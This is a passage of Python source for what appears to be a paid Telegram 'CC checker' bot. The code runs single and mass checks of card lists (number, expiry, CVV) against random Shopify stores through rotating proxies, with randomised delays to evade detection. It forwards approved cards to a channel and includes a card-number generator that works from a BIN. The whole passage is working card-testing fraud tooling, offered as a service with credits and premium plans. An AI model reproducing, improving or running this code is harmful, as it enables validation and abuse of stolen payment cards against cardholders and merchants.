{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} {gateway} ${price_display}
{get_emoji_text('info')} {to_bold('Response ⇾')} {clean_response}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
            await send_approved_to_channel_shopify_async(cc, mes, ano, cvv, price_display, clean_response, time_taken, username, user_plan, gateway)
        
        elif success and "OTP" in str(message_text).upper():
            result_text = f"""{get_emoji_text('otp')} {to_bold('OTP REQUIRED')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} {gateway} ${price_display}
{get_emoji_text('info')} {to_bold('Response ⇾')} {clean_response}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
        
        elif success and "INSUFFICIENT_FUNDS" in clean_response.upper():
            result_text = f"""{get_emoji_text('insufficient')} {to_bold('INSUFFICIENT FUNDS')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} {gateway} ${price_display}
{get_emoji_text('info')} {to_bold('Response ⇾')} {clean_response}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {time_taken}"""
            await send_approved_to_channel_shopify_async(cc, mes, ano, cvv, price_display, clean_response, time_taken, username, user_plan, gateway)
        
        allowed_responses = ["ORDER_PLACED", "CARD_DECLINED", "GENERIC_ERROR", "OTP_REQUIRED", "MISMATCHED_BILL", "INSUFFICIENT_FUNDS"]
        if clean_response not in allowed_responses and clean_response.upper() not in [r.upper() for r in allowed_responses]:
            remove_bad_site(site)
            logger.info(f"🗑️ تم حذف الموقع {site} من الأمر الفردي لأن النتيجة: {clean_response}")
        
        await msg.edit_text(result_text, parse_mode="HTML")
            
    except Exception as e:
        logger.error(f"Error in shopify_check_command: {e}")
        error_text = f"{get_emoji_text('error')} {to_bold('Error!')}\n\n{str(e)}"
        await msg.edit_text(error_text, parse_mode="HTML")

async def shopify_mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if not check_user_subscription(user_id):
        await update.message.reply_text(get_subscription_required_text(), reply_markup=subscription_required_keyboard(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    if not is_premium(user_id):
        await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('Premium Only!')}

{get_emoji_text('info')} {to_bold('This command is for premium users only.')}
{get_emoji_text('buy')} {to_bold('Subscribe now to get access.')}

{get_emoji_text('dm')} {to_bold('Contact:')} @hhhiqh""", parse_mode="HTML")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(f"""{get_emoji_text('shopify')} {to_bold('Usage: Reply to .txt file with /ms')}

{get_emoji_text('plus')} {to_bold('File format: One card per line')}
<code>CC|MM|YYYY|CVV</code>

{get_emoji_text('info')} {to_bold('Each card will be checked on a random site from sites.txt')}""", parse_mode="HTML")
        return
    
    user_proxies = get_user_proxies(user_id)
    
    if not is_owner(user_id):
        if not user_proxies:
            await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('Proxy Required!')}

{get_emoji_text('proxy')} {to_bold('You must add a proxy first!')}

{get_emoji_text('plus')} {to_bold('Use command:')}
<code>/add_proxy IP:PORT:USER:PASS</code>""", parse_mode="HTML")
            return
    
    try:
        file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
        file_content = await file.download_as_bytearray()
    except Exception as e:
        await update.message.reply_text(f"{get_emoji_text('error')} {to_bold('Error downloading file!')}\n\n{str(e)}", parse_mode="HTML")
        return
    
    cards = []
    content = file_content.decode('utf-8')
    
    for line in content.split('\n'):
        line = line.strip()
        if line and '|' in line:
            parts = line.split('|')
            if len(parts) == 4:
                cards.append(line)
    
    if not cards:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('No valid cards found!')}\n\n{get_emoji_text('plus')} {to_bold('Format:')} <code>CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return
    
    MAX_CARDS = 1000000
    if not is_admin(user_id):
        if len(cards) > MAX_CARDS:
            await update.message.reply_text(f"""{get_emoji_text('warning')} {to_bold('Too many cards!')}

{get_emoji_text('card')} {to_bold('You have:')} {len(cards)}
{get_emoji_text('limit')} {to_bold('Maximum for free users:')} {MAX_CARDS}
{get_emoji_text('info')} {to_bold('Please split into smaller files or upgrade to Premium.')}""", parse_mode="HTML")
            return
    else:
        if len(cards) > 1000000:
            await update.message.reply_text(f"""{get_emoji_text('warning')} {to_bold('Too many cards!')}

{get_emoji_text('card')} {to_bold('You have:')} {len(cards)}
{get_emoji_text('limit')} {to_bold('Maximum:')} 10000
{get_emoji_text('info')} {to_bold('Please split into smaller files.')}""", parse_mode="HTML")
            return
    
    total_needed = len(cards)
    current_user = get_user(user_id)
    
    if current_user and current_user["plan"] not in ["Owner", "Admin"] and current_user["credits"] < total_needed:
        await update.message.reply_text(f"""{get_emoji_text('error')} {to_bold('Not enough credits!')}

{get_emoji_text('credit')} {to_bold('You have:')} {current_user['credits']}
{get_emoji_text('card')} {to_bold('Needed:')} {total_needed}""", parse_mode="HTML")
        return
    
    proxy = get_random_proxy_for_user(user_id, user_proxies) if user_proxies else None
    
    msg_text = f"""{get_emoji_text('mass')} {to_bold('Starting Shopify Mass Check...')}

{get_emoji_text('shopify')} {to_bold('Gateway: Shopify')}
{get_emoji_text('card')} {to_bold('Cards:')} {total_needed}"""
    
    if proxy:
        msg_text += f"\n{get_emoji_text('proxy')} {to_bold('Proxy:')} <code>{proxy[:20]}...</code>"
    else:
        msg_text += f"\n{get_emoji_text('proxy')} {to_bold('Proxy:')} {to_bold('None (Owner Mode)')}"
    
    msg_text += f"\n{get_emoji_text('speed')} {to_bold('Speed: Batch Size 15')}\n\n{get_emoji_text('loading')} {to_bold('Processing...')}"
    
    msg = await update.message.reply_text(
        msg_text,
        reply_markup=mass_keyboard(0, 0, total_needed, True, 0, 0, 0, "⏳ Starting..."),
        parse_mode="HTML"
    )
    
    check_id = str(uuid.uuid4())
    mass_check_running[user_id] = check_id
    stats = get_user_stats(user_id)
    user_plan = stats['plan']
    
    context.application.create_task(
        run_shopify_mass_optimized(update, context, user_id, username, user_plan, cards, msg, check_id)
    )

async def run_shopify_mass_optimized(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, username, user_plan, cards, msg, check_id):
    try:
        logger.info("=" * 50)
        logger.info("🚀 STARTING OPTIMIZED MASS CHECK")
        logger.info(f"📊 User ID: {user_id}")
        logger.info(f"📊 Cards Count: {len(cards)}")
        logger.info(f"📊 Batch Size: 15")
        logger.info("=" * 50)
        
        approved = 0
        declined = 0
        insufficient_funds = 0
        unsupported_gateways = 0
        otp_count = 0
        checked = 0
        stopped_no_credits = False
        last_response = "⏳ Waiting..."
        
        user_proxies = get_user_proxies(user_id)
        logger.info(f"📊 Proxies Count: {len(user_proxies)}")
        
        if not user_proxies and not is_owner(user_id):
            logger.error("❌ No proxies found!")
            await msg.edit_text(f"""{get_emoji_text('error')} {to_bold('No Proxies Available!')}

{get_emoji_text('proxy')} {to_bold('Please add proxies using /add_proxy')}""")
            if user_id in mass_check_running:
                del mass_check_running[user_id]
            return
        
        async def process_batch(batch_cards, batch_proxies):
            tasks = []
            task_sites = []
            task_proxies = []
            
            for idx, card in enumerate(batch_cards):
                try:
                    parts = card.split('|')
                    if len(parts) != 4:
                        continue
                    
                    cc, mon, year, cvv = parts
                    
                    proxy = get_random_proxy_for_user(user_id, batch_proxies) if batch_proxies else None
                    
                    site_url = get_random_site_for_user(user_id)
                    if not site_url:
                        site_url = "example.myshopify.com"
                    
                    task_sites.append(site_url)
                    task_proxies.append(proxy)
                    tasks.append(shopify_check_card_async(cc, mon, year, cvv, site_url, None, proxy))
                    
                    await asyncio.sleep(random.uniform(0.2, 0.8))
                    
                except Exception as e:
                    logger.error(f"⚠️ Error preparing card {card}: {e}")
                    continue
            
            if not tasks:
                return [], [], []
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            return results, task_sites, task_proxies
        
        BATCH_SIZE = 15
        start_total_time = time.time()
        
        for i in range(0, len(cards), BATCH_SIZE):
            if user_id not in mass_check_running or mass_check_running[user_id] != check_id:
                logger.info("🛑 Stopped by user")
                break
            
            current_user_data = get_user(user_id)
            if current_user_data and current_user_data["plan"] not in ["Owner", "Admin"] and current_user_data["credits"] <= 0:
                stopped_no_credits = True
                logger.info("💳 Out of credits")
                break
            
            batch = cards[i:i+BATCH_SIZE]
            batch_num = (i // BATCH_SIZE) + 1
            total_batches = (len(cards) + BATCH_SIZE - 1) // BATCH_SIZE
            
            logger.info(f"\n📦 Batch {batch_num}/{total_batches} - {len(batch)} cards")
            
            try:
                start_time = time.time()
                results, task_sites, task_proxies = await process_batch(batch, user_proxies)
                batch_time = time.time() - start_time
                
                logger.info(f"⏱️ Batch completed in {batch_time:.2f}s")
                
                for card, result, site_url, proxy in zip(batch, results, task_sites, task_proxies):
                    if user_id not in mass_check_running or mass_check_running[user_id] != check_id:
                        break
                    
                    if isinstance(result, Exception):
                        logger.error(f"❌ Exception: {result}")
                        declined += 1
                        checked += 1
                        last_response = "❌ ERROR"
                        continue
                    
                    try:
                        if len(result) >= 4:
                            success, message_text, gateway, price, currency = result
                        else:
                            success = False
                            message_text = "UNKNOWN_ERROR"
                            gateway = "UNKNOWN"
                            price = "0.00"
                            currency = "USD"
                    except:
                        success = False
                        message_text = "UNKNOWN_ERROR"
                        gateway = "UNKNOWN"
                        price = "0.00"
                        currency = "USD"
                    
                    if message_text is None:
                        message_text = "UNKNOWN_ERROR"
                    if gateway is None:
                        gateway = "UNKNOWN"
                    if price is None:
                        price = "0.00"
                    if currency is None:
                        currency = "USD"
                    
                    clean_response = extract_clean_response(message_text)
                    last_response = clean_response
                    
                    try:
                        price_float = float(price)
                        price_display = f"{price_float:.2f}"
                    except:
                        price_display = "0.00"
                    
                    parts = card.split('|')
                    if len(parts) == 4:
                        cc, mon, year, cvv = parts
                    else:
                        declined += 1
                        checked += 1
                        continue
                    
                    logger.info(f"📊 Card: {cc[:6]}...{cc[-4:]} | Site: {site_url} | Proxy: {proxy[:15] if proxy else 'None'}... -> {clean_response}")
                    
                    card_formatted = format_card_text(cc, mon, year, cvv)
                    
                    if success and clean_response in ["ORDER_PLACED", "LIVE"]:
                        approved += 1
                        logger.info("✅ APPROVED!")
                        
                        bin_info = get_bin_info(cc[:6])
                        brand = bin_info.get('brand', 'Unknown')
                        card_type = bin_info.get('type', 'Unknown')
                        level = bin_info.get('level', '')
                        bank = bin_info.get('bank', 'Unknown')
                        country = bin_info.get('country', 'Unknown')
                        flag = bin_info.get('flag', '')
                        type_display = f"{card_type}"
                        if level:
                            type_display += f" - {level}"
                        
                        try:
                            approved_text = f"""{get_emoji_text('approved')} {to_bold('APPROVED')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} {gateway} ${price_display}
{get_emoji_text('info')} {to_bold('Response ⇾')} {clean_response}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {to_bold(f'Batch {batch_num}/{total_batches}')}"""
                            await update.message.reply_text(approved_text, parse_mode="HTML")
                            await send_approved_to_channel_shopify_async(cc, mon, year, cvv, price_display, clean_response, f"Batch {batch_num}/{total_batches}", username, user_plan, gateway)
                        except Exception as e:
                            logger.error(f"⚠️ Failed to send approved: {e}")
                    
                    elif success and "OTP" in clean_response:
                        otp_count += 1
                        logger.info("🔑 OTP REQUIRED")
                        
                        bin_info = get_bin_info(cc[:6])
                        brand = bin_info.get('brand', 'Unknown')
                        card_type = bin_info.get('type', 'Unknown')
                        level = bin_info.get('level', '')
                        bank = bin_info.get('bank', 'Unknown')
                        country = bin_info.get('country', 'Unknown')
                        flag = bin_info.get('flag', '')
                        type_display = f"{card_type}"
                        if level:
                            type_display += f" - {level}"
                        
                        try:
                            otp_text = f"""{get_emoji_text('otp')} {to_bold('OTP REQUIRED')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} {gateway} ${price_display}
{get_emoji_text('info')} {to_bold('Response ⇾')} {clean_response}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {to_bold(f'Batch {batch_num}/{total_batches}')}"""
                            await update.message.reply_text(otp_text, parse_mode="HTML")
                        except Exception as e:
                            logger.error(f"⚠️ Failed to send OTP: {e}")
                    
                    elif success and "INSUFFICIENT_FUNDS" in clean_response.upper():
                        insufficient_funds += 1
                        logger.info("💳 INSUFFICIENT FUNDS")
                        
                        bin_info = get_bin_info(cc[:6])
                        brand = bin_info.get('brand', 'Unknown')
                        card_type = bin_info.get('type', 'Unknown')
                        level = bin_info.get('level', '')
                        bank = bin_info.get('bank', 'Unknown')
                        country = bin_info.get('country', 'Unknown')
                        flag = bin_info.get('flag', '')
                        type_display = f"{card_type}"
                        if level:
                            type_display += f" - {level}"
                        
                        try:
                            insufficient_text = f"""{get_emoji_text('insufficient')} {to_bold('INSUFFICIENT FUNDS')}

{get_emoji_text('card')} {to_bold('CC ⇾')} <code>{card_formatted}</code>
{get_emoji_text('gateway')} {to_bold('Gateway ⇾')} {gateway} ${price_display}
{get_emoji_text('info')} {to_bold('Response ⇾')} {clean_response}

{get_emoji_text('brand_icon')} {to_bold('BIN Info ⇾')} {brand} - {type_display}
{get_emoji_text('bank')} {to_bold('Bank ⇾')} {bank.upper() if bank else 'Unknown'}
{get_emoji_text('country')} {to_bold('Country ⇾')} {country} {flag if flag else ''}

{to_bold('Checked ⇾')} @{username} | {user_plan}
{get_emoji_text('time')} {to_bold('Time ⇾')} {to_bold(f'Batch {batch_num}/{total_batches}')}"""
                            await update.message.reply_text(insufficient_text, parse_mode="HTML")
                        except Exception as e:
                            logger.error(f"⚠️ Failed to send insufficient funds: {e}")
                    
                    else:
                        declined += 1
                        logger.info("❌ DECLINED")
                    
                    if current_user_data and current_user_data["plan"] not in ["Owner", "Admin"]:
                        deduct_credit(user_id)
                    
                    allowed_responses = ["ORDER_PLACED", "CARD_DECLINED", "GENERIC_ERROR", "OTP_REQUIRED", "MISMATCHED_BILL", "INSUFFICIENT_FUNDS"]
                    if clean_response not in allowed_responses and clean_response.upper() not in [r.upper() for r in allowed_responses]:
                        if site_url:
                            remove_bad_site(site_url)
                            logger.info(f"🗑️ تم حذف الموقع {site_url} من الماس شيك لأن النتيجة: {clean_response}")
                    
                    checked += 1
                    
                    if checked % 3 == 0 or checked == len(cards):
                        try:
                            stats = get_user_stats(user_id)
                            credits_display = "∞" if stats['plan'] in ['Owner', 'Admin'] else stats['credits']
                            username_display = username or "N/A"
                            
                            update_text = f"""{get_emoji_text('shopify')} {to_bold('Shopify Mass Checking...')}

{get_emoji_text('credit')} {to_bold('Credits:')} {credits_display}
{get_emoji_text('card')} {to_bold('Cards:')} {len(cards)}
{get_emoji_text('user')} {to_bold('User:')} @{username_display}
"""
                            
                            await msg.edit_text(
                                update_text,
                                reply_markup=mass_keyboard(
                                    approved, 
                                    declined, 
                                    len(cards), 
                                    True, 
                                    insufficient_funds, 
                                    unsupported_gateways,
                                    otp_count,
                                    last_response
                                ),
                                parse_mode="HTML"
                            )
                        except Exception as e:
                            logger.error(f"⚠️ Failed to update message: {e}")
                
                if i + BATCH_SIZE < len(cards):
                    wait_time = random.uniform(1.5, 3.0)
                    logger.info(f"⏳ Waiting {wait_time:.1f}s before next batch...")
                    await asyncio.sleep(wait_time)
                
            except Exception as e:
                logger.error(f"❌ Batch {batch_num} error: {e}")
                traceback.print_exc()
                declined += len(batch)
                checked += len(batch)
                last_response = "❌ ERROR"
        
        total_time = time.time() - start_total_time
        final_status = "Out of Credits!" if stopped_no_credits else "Complete!"
        
        logger.info(f"\n📊 FINAL: {final_status}")
        logger.info(f"✅ Approved: {approved}")
        logger.info(f"❌ Declined: {declined}")
        logger.info(f"💳 Insufficient Funds: {insufficient_funds}")
        logger.info(f"🔑 OTP: {otp_count}")
        logger.info(f"🚫 Unsupported Gateways: {unsupported_gateways}")
        logger.info(f"📊 Total: {checked}")
        logger.info(f"⏱️ Total Time: {total_time:.2f}s")
        logger.info(f"⚡ Average Speed: {checked/total_time:.1f} cards/sec")
        
        stats = get_user_stats(user_id)
        credits_display = "∞" if stats['plan'] in ['Owner', 'Admin'] else stats['credits']
        
        final_text = f"""{get_emoji_text('success')} {to_bold(f'Shopify Mass Check {final_status}')}

{get_emoji_text('credit')} {to_bold('Credits:')} {credits_display}
{get_emoji_text('card')} {to_bold('Cards:')} {len(cards)}
{get_emoji_text('user')} {to_bold('User:')} @{username}
{get_emoji_text('time')} {to_bold('Time:')} {total_time:.2f}s
"""
        
        await msg.edit_text(
            final_text,
            reply_markup=mass_keyboard(
                approved, 
                declined, 
                len(cards), 
                False, 
                insufficient_funds, 
                unsupported_gateways,
                otp_count,
                "✅ Complete!"
            ),
            parse_mode="HTML"
        )
        
        if user_id in mass_check_running:
            del mass_check_running[user_id]
            
        logger.info("=" * 50)
        logger.info("✅ OPTIMIZED MASS CHECK COMPLETE")
        logger.info("=" * 50)
        
    except Exception as e:
        logger.error(f"💥 FATAL ERROR: {e}")
        traceback.print_exc()
        
        try:
            await msg.edit_text(f"""{get_emoji_text('error')} {to_bold('Fatal Error!')}

{str(e)}""")
        except:
            pass
        
        if user_id in mass_check_running:
            del mass_check_running[user_id]

async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    bin_str = None
    quantity = 10
    exp_month = None
    exp_year = None
    cvv = None
    
    if len(args) >= 2:
        first_arg = args[1]
        if '|' in first_arg:
            parts = first_arg.split('|')
            bin_str = parts[0]
            if len(parts) >= 2:
                exp_month = parts[1]
            if len(parts) >= 3:
                exp_year = parts[2]
            if len(parts) >= 4:
                cvv = parts[3]
    
    for arg in args[1:]:
        if arg.startswith('q=') or arg.startswith('Q='):
            try:
                quantity = min(int(arg.split('=')[1]), 100)
            except:
                pass
        elif arg.startswith('m=') or arg.startswith('M='):
            exp_month = arg.split('=')[1]
        elif arg.startswith('y=') or arg.startswith('Y='):
            exp_year = arg.split('=')[1]
        elif arg.startswith('c=') or arg.startswith('C='):
            cvv = arg.split('=')[1]
        elif arg.isdigit() and len(arg) >= 6 and '|' not in arg:
            bin_str = arg    
    if not bin_str or not bin_str.isdigit() or len(bin_str) < 6:
        await update.message.reply_text(f"""{get_emoji_text('gen')} {to_bold('CC Generator Usage:')}

{get_emoji_text('card')} {to_bold('Basic:')} /gen 440393
{get_emoji_text('card')} {to_bold('With Date:')} /gen 440393|01|2026
{get_emoji_text('card')} {to_bold('With CVV:')} /gen 440393|01|2026|521
{get_emoji_text('card')} {to_bold('With Quantity:')} /gen 440393 q=50
{get_emoji_text('card')} {to_bold('Full:')} /gen 440393|01|2026|521 q=20

{get_emoji_text('info')} {to_bold('BIN: 6 to 14 digits')}""", parse_mode="HTML")
        return
    
    bin_info = get_bin_info(bin_str[:6])
    cards = generate_cc(bin_str, exp_month, exp_year, cvv, quantity)
    brand = bin_info.get('brand', cards[0]['brand'])
    card_type = bin_info.get('type', get_brand_from_bin(bin_str[:6])['type'])
    level = bin_info.get('level', '')
    bank = bin_info.get('bank', 'Unknown')
    country = bin_info.get('country', 'Unknown')
    flag = bin_info.get('flag', '')
    type_display = f"{card_type}"
    if level:
        type_display = f"{card_type} · {level}"
    
    text = f"""{get_emoji_text('gen')} {to_bold('CC GENERATOR')}
━━━━━━━━━━━━━━━━━━━━
{get_emoji_text('bin_icon')} {to_bold('BIN:')} {bin_str[:6]}  ·  {get_emoji_text('count_icon')} {quantity} cards
━━━━━━━━━━━━━━━━━━━━
"""
    for card in cards:
        text += f"<code>{card['formatted']}</code>\n"
    text += f"""━━━━━━━━━━━━━━━━━━━━
{get_emoji_text('brand_icon')} {brand} · {type_display}"""
    if bank != "Unknown":
        text += f"\n{get_emoji_text('bank')} {bank.upper()}"
    if country != "Unknown":
        text += f"\n{get_emoji_text('country')} {country} {flag}"
    
    if quantity > 15:
        file_content = "\n".join([c['formatted'] for c in cards])
        file_name = f"gen_{bin_str[:6]}_{quantity}.txt"
        with open(file_name, 'w') as f:
            f.write(file_content)
        with open(file_name, 'rb') as f:
            await update.message.reply_document(f, caption=f"{get_emoji_text('gen')} {quantity} Cards | {get_emoji_text('bin_icon')} BIN: {bin_str[:6]} | {brand} - {type_display}")
        os.remove(file_name)
    else:
        await update.message.reply_text(text, parse_mode="HTML")

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    stats = get_user_stats(user_id)
    plan_text = stats['plan']
    if plan_text in ['Owner', 'Admin']:
        plan_show = f"{get_emoji_text('crown')} {to_bold(plan_text)}"
    elif plan_text == 'Premium':
        plan_show = f"{get_emoji_text('premium')} {to_bold(plan_text)}"
    else:
        plan_show = f"{get_emoji_text('free')} {to_bold(plan_text)}"
    
    await update.message.reply_text(f"""{get_emoji_text('user')} {to_bold('Your Balance')}

{plan_show}
{get_emoji_text('credit')} {to_bold('Credits:')} {stats['credits']}
{get_emoji_text('proxy')} {to_bold('Proxy:')} {get_emoji_text('check_yes') if stats['proxy'] == 'Set' else get_emoji_text('check_no')} {stats['proxy']}""", parse_mode="HTML")

async def me_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    stats = get_user_stats(user_id)
    plan_text = stats['plan']
    if plan_text in ['Owner', 'Admin']:
        plan_show = f"{get_emoji_text('crown')} {to_bold(plan_text)}"
    elif plan_text == 'Premium':
        plan_show = f"{get_emoji_text('premium')} {to_bold(plan_text)}"
    else:
        plan_show = f"{get_emoji_text('free')} {to_bold(plan_text)}"
    
    proxies = get_user_proxies(user_id)
    proxy_count = len(proxies)
    
    text = f"""{get_emoji_text('me')} {to_bold('Your Info')}

{get_emoji_text('id')} {to_bold('ID:')} <code>{user_id}</code>
{get_emoji_text('user')} {to_bold('Username:')} @{username}
{plan_show}
{get_emoji_text('credit')} {to_bold('Credits:')} {stats['credits']}
{get_emoji_text('proxy')} {to_bold('Proxies:')} {proxy_count}
{get_emoji_text('proxy')} {to_bold('Proxy Status:')} {'✅ Set' if proxy_count > 0 else '❌ Not Set'}"""
    await update.message.reply_text(text, parse_mode="HTML")

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {get_emoji_text('error')} {to_bold('Access Denied!')}", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"{get_emoji_text('code')} {to_bold('Usage: /code [credits]')}\n{get_emoji_text('plus')} {to_bold('Example: /code 100')}", parse_mode="HTML")
        return
    
    try:
        credits = int(args[1])
    except:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Invalid number!')}", parse_mode="HTML")
        return
    
    code = create_code(credits, user_id)
    await update.message.reply_text(f"""{get_emoji_text('success')} {to_bold('Code Created!')}

{get_emoji_text('code')} <code>{code}</code>
{get_emoji_text('credit')} {to_bold('Credits:')} {credits}""", parse_mode="HTML")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"{get_emoji_text('redeem')} {to_bold('Usage: /redeem [code]')}", parse_mode="HTML")
        return
    
    code = args[1].upper()
    credits = redeem_code(user_id, code)
    if credits:
        stats = get_user_stats(user_id)
        await update.message.reply_text(f"""{get_emoji_text('success')} {to_bold('Code Redeemed!')}

{get_emoji_text('plus')} {to_bold(f'+{credits} credits!')}
{get_emoji_text('credit')} {to_bold('Total:')} {stats['credits']}
{get_emoji_text('plan')} {to_bold('Plan:')} {stats['plan']}""", parse_mode="HTML")
        await notify_admins_on_redeem_async(user_id, username, code, credits)
    else:
        await update.message.reply_text(f"{get_emoji_text('error')} {to_bold('Invalid or Used Code!')}", parse_mode="HTML")

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Owner Only!')}", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"{get_emoji_text('admin')} {to_bold('Usage: /admin [user_id]')}", parse_mode="HTML")
        return
    
    try:
        target_id = int(args[1])
    except:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Invalid ID!')}", parse_mode="HTML")
        return
    
    create_user(target_id, "Admin")
    make_admin(target_id)
    await update.message.reply_text(f"{get_emoji_text('success')} {to_bold('Admin Added!')}\n\n{get_emoji_text('admin')} {to_bold(f'User {target_id} is now Admin!')}", parse_mode="HTML")

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Admin only!')}", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"{get_emoji_text('remove')} {to_bold('Usage: /remove [user_id]')}", parse_mode="HTML")
        return
    
    try:
        target_id = int(args[1])
    except:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Invalid ID!')}", parse_mode="HTML")
        return
    
    if target_id == OWNER_ID:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Cannot remove owner!')}", parse_mode="HTML")
        return
    
    target_user = get_user(target_id)
    if not target_user:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('User not found!')}", parse_mode="HTML")
        return
    
    remove_user_subscription(target_id)
    await update.message.reply_text(f"""{get_emoji_text('success')} {to_bold('Subscription Removed!')}

{get_emoji_text('remove')} {to_bold(f'User {target_id} subscription has been cancelled.')}
{get_emoji_text('credit')} {to_bold('Credits reset to 0')}
{get_emoji_text('free')} {to_bold('Plan set to Free')}""", parse_mode="HTML")

async def premium_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Admin only!')}", parse_mode="HTML")
        return
    
    premium_users = get_premium_users()
    if not premium_users:
